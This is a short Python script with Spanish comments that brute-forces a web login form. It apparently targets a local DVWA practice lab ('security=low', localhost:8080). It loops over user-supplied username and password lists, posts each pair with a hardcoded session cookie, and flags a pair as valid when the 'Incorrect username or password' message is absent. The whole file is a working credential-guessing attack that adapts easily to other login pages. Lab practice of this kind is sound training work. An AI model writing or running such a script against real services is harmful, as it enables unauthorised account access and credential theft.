import requests

# Configuración
url = "http://localhost:8080/vulnerabilities/brute/"
headers = {
    "Cookie": "PHPSESSID=ppu8vfre8mrgqbcr8j3tdme5m5; security=low;",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Pedir al usuario que ingrese los posibles usuarios y contraseñas
usuarios = input("Ingrese los posibles usuarios (separados por coma): ").split(",")
contraseñas = input("Ingrese las posibles contraseñas (separados por coma): ").split(",")

# Función para realizar el ataque de fuerza bruta
def fuerza_bruta():
    for usuario in usuarios:
        for contraseña in contraseñas:
            datos = {
                "username": usuario.strip(),
                "password": contraseña.strip(),
                "Login": "Login"
            }
            respuesta = requests.post(url, headers=headers, data=datos)
            print(f"Intentando usuario {usuario} y contraseña {contraseña}...")
            print(f"Respuesta: {respuesta.text}")
            if respuesta.status_code == 200 and "Incorrect username or password" not in respuesta.text:
                print(f"Credenciales válidas encontradas: {usuario}:{contraseña}")
                return  # Detener la función después de encontrar una combinación válida
    print("No se encontraron credenciales válidas.")

# Ejecutar el ataque de fuerza bruta
fuerza_bruta()



